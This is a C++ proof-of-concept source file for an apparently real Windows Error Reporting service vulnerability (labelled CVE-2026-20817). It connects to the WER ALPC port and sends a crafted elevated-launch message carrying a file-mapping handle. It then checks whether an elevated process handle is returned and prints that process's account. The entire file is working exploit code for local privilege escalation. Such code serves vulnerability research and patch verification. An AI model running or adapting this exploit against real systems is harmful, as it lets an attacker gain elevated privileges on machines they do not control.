#include <Windows.h>
#include <winternl.h>
#include <cstdio>
#include <cstddef>

using NtAlpcConnectPort_t = NTSTATUS(NTAPI*)(
    PHANDLE, PUNICODE_STRING, POBJECT_ATTRIBUTES, PVOID, ULONG, PSID,
    PVOID, PSIZE_T, PVOID, PVOID, PLARGE_INTEGER);
using NtAlpcSendWaitReceivePort_t = NTSTATUS(NTAPI*)(
    HANDLE, ULONG, PVOID, PVOID, PVOID, PSIZE_T, PVOID,
    PLARGE_INTEGER);

struct LocalPortMessage {
    union {
        struct { SHORT DataLength; SHORT TotalLength; } s1;
        ULONG Length;
    } u1;
    union {
        struct { SHORT Type; SHORT DataInfoOffset; } s2;
        ULONG ZeroInit;
    } u2;
    union { CLIENT_ID ClientId; double Alignment; };
    ULONG MessageId;
    union { SIZE_T ClientViewSize; ULONG CallbackId; };
};

struct AlpcPortAttributes {
    ULONG Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    SIZE_T MaxMessageLength;
    SIZE_T MemoryBandwidth;
    SIZE_T MaxPoolUsage;
    SIZE_T MaxSectionSize;
    SIZE_T MaxViewSize;
    SIZE_T MaxTotalSectionSize;
    ULONG DupObjectTypes;
    ULONG Reserved;
};

struct WerSvcElevatedLaunchMessage {
    LocalPortMessage PortMessage;   // +0x00
    DWORD MessageFlags;             // +0x28
    DWORD LastError;                // +0x2c
    BOOL CreateProcess;             // +0x30
    DWORD Reserved34;               // +0x34
    HANDLE FileMapping;             // +0x38
    HANDLE SourceHandles[16];       // +0x40
    DWORD SourceHandleCount;        // +0xc0
    DWORD ReservedC4;               // +0xc4
    HANDLE NewProcessHandle;        // +0xc8
    BYTE Padding[1192];             // total 0x578
};

static_assert(sizeof(void*) == 8, "Build this PoC for x64.");
static_assert(sizeof(WerSvcElevatedLaunchMessage) == 0x578);
static_assert(offsetof(WerSvcElevatedLaunchMessage, MessageFlags) == 0x28);
static_assert(offsetof(WerSvcElevatedLaunchMessage, FileMapping) == 0x38);
static_assert(offsetof(WerSvcElevatedLaunchMessage, NewProcessHandle) == 0xc8);

constexpr ULONG kAlpcSyncRequest = 0x20000;
constexpr DWORD kElevatedLaunch = 0x50000000;
constexpr NTSTATUS kStatusObjectNameNotFound = static_cast<NTSTATUS>(0xC0000034L);

static bool NtSuccess(NTSTATUS status)
{
    return status >= 0;
}

static bool IsWerSvcRunning()
{
    SC_HANDLE manager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!manager) {
        wprintf(L"[-] OpenSCManagerW failed: %lu\n", GetLastError());
        return false;
    }

    SC_HANDLE service = OpenServiceW(manager, L"WerSvc", SERVICE_QUERY_STATUS);
    if (!service) {
        wprintf(L"[-] OpenServiceW(WerSvc) failed: %lu\n", GetLastError());
        CloseServiceHandle(manager);
        return false;
    }

    SERVICE_STATUS_PROCESS status = {};
    DWORD bytesNeeded = 0;
    if (!QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,
                              reinterpret_cast<BYTE*>(&status), sizeof(status),
                              &bytesNeeded)) {
        wprintf(L"[-] QueryServiceStatusEx(WerSvc) failed: %lu\n", GetLastError());
        CloseServiceHandle(service);
        CloseServiceHandle(manager);
        return false;
    }

    const bool running = status.dwCurrentState == SERVICE_RUNNING;
    wprintf(L"[+] WerSvc service state: 0x%lx pid=%lu\n",
            status.dwCurrentState, status.dwProcessId);
    CloseServiceHandle(service);
    CloseServiceHandle(manager);
    return running;
}

static void InitUnicodeString(UNICODE_STRING* destination, const wchar_t* source)
{
    const size_t bytes = wcslen(source) * sizeof(wchar_t);
    destination->Length = static_cast<USHORT>(bytes);
    destination->MaximumLength = static_cast<USHORT>(bytes + sizeof(wchar_t));
    destination->Buffer = const_cast<PWCH>(source);
}

static void PrintCreatedProcess(HANDLE process)
{
    wchar_t image[MAX_PATH] = {};
    DWORD imageLength = ARRAYSIZE(image);
    if (QueryFullProcessImageNameW(process, 0, image, &imageLength)) {
        wprintf(L"[+] Image: %s\n", image);
    }

    wprintf(L"[+] PID: %lu\n", GetProcessId(process));

    HANDLE token = nullptr;
    if (!OpenProcessToken(process, TOKEN_QUERY, &token)) {
        wprintf(L"[!] OpenProcessToken failed: %lu\n", GetLastError());
        return;
    }

    BYTE buffer[512] = {};
    DWORD needed = 0;
    if (GetTokenInformation(token, TokenUser, buffer, sizeof(buffer), &needed)) {
        const auto tokenUser = reinterpret_cast<TOKEN_USER*>(buffer);
        wchar_t name[128] = {};
        wchar_t domain[128] = {};
        DWORD nameLength = ARRAYSIZE(name);
        DWORD domainLength = ARRAYSIZE(domain);
        SID_NAME_USE use;
        if (LookupAccountSidW(nullptr, tokenUser->User.Sid, name, &nameLength,
                              domain, &domainLength, &use)) {
            wprintf(L"[+] Token user: %s\\%s\n", domain, name);
        }
    }
    CloseHandle(token);
}

int wmain(int argc, wchar_t** argv)
{
    const wchar_t* options = argc > 1 ? argv[1] : L"SG_CVE_2026_20817_TEST";
    wprintf(L"[*] WerFault options: %s\n", options);

    if (!IsWerSvcRunning()) {
        wprintf(L"[-] WerSvc service is not running; start it before sending the ALPC message\n");
        return 1;
    }

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    const auto NtAlpcConnectPort = reinterpret_cast<NtAlpcConnectPort_t>(
        GetProcAddress(ntdll, "NtAlpcConnectPort"));
    const auto NtAlpcSendWaitReceivePort =
        reinterpret_cast<NtAlpcSendWaitReceivePort_t>(
            GetProcAddress(ntdll, "NtAlpcSendWaitReceivePort"));
    if (!NtAlpcConnectPort || !NtAlpcSendWaitReceivePort) {
        wprintf(L"[-] Required ALPC exports are unavailable.\n");
        return 2;
    }

    UNICODE_STRING portName = {};
    InitUnicodeString(&portName, L"\\WindowsErrorReportingServicePort");

    AlpcPortAttributes attributes = {};
    attributes.MaxMessageLength = sizeof(WerSvcElevatedLaunchMessage);

    HANDLE port = nullptr;
    NTSTATUS status = NtAlpcConnectPort(
        &port, &portName, nullptr, &attributes, kAlpcSyncRequest, nullptr,
        nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!NtSuccess(status)) {
        wprintf(L"[-] NtAlpcConnectPort: 0x%08X\n", static_cast<ULONG>(status));
        if (status == kStatusObjectNameNotFound) {
            wprintf(L"[!] WER service is not running or ErrorPort is customized.\n");
        }
        return 3;
    }
    wprintf(L"[+] Connected to WER ALPC port.\n");

    constexpr DWORD mappingSize = MAX_PATH * sizeof(wchar_t);
    HANDLE mapping = CreateFileMappingW(
        INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, mappingSize, nullptr);
    if (!mapping) {
        wprintf(L"[-] CreateFileMappingW: %lu\n", GetLastError());
        CloseHandle(port);
        return 4;
    }

    void* view = MapViewOfFile(mapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    if (!view) {
        wprintf(L"[-] MapViewOfFile: %lu\n", GetLastError());
        CloseHandle(mapping);
        CloseHandle(port);
        return 5;
    }
    wcsncpy_s(static_cast<wchar_t*>(view), mappingSize / sizeof(wchar_t),
              options, _TRUNCATE);

    WerSvcElevatedLaunchMessage message = {};
    message.PortMessage.u1.s1.TotalLength = sizeof(message);
    message.PortMessage.u1.s1.DataLength =
        sizeof(message) - sizeof(LocalPortMessage);
    message.MessageFlags = kElevatedLaunch;
    message.CreateProcess = TRUE;
    message.FileMapping = mapping;

    SIZE_T replyLength = sizeof(message);
    status = NtAlpcSendWaitReceivePort(
        port, kAlpcSyncRequest, &message.PortMessage, nullptr,
        &message.PortMessage, &replyLength, nullptr, nullptr);

    wprintf(L"[*] NTSTATUS: 0x%08X\n", static_cast<ULONG>(status));
    if (NtSuccess(status)) {
        wprintf(L"[*] Reply flags: 0x%08lX\n", message.MessageFlags);
        wprintf(L"[*] Service error: 0x%08lX\n", message.LastError);
        wprintf(L"[*] Process handle: %p\n", message.NewProcessHandle);
        if (message.LastError == ERROR_SUCCESS && message.NewProcessHandle) {
            wprintf(L"[+] Vulnerable elevated-launch primitive reached.\n");
            PrintCreatedProcess(message.NewProcessHandle);
            CloseHandle(message.NewProcessHandle);
        } else {
            wprintf(L"[-] No elevated process was returned (expected when patched).\n");
        }
    }

    UnmapViewOfFile(view);
    CloseHandle(mapping);
    CloseHandle(port);
    return NtSuccess(status) ? 0 : 6;
}
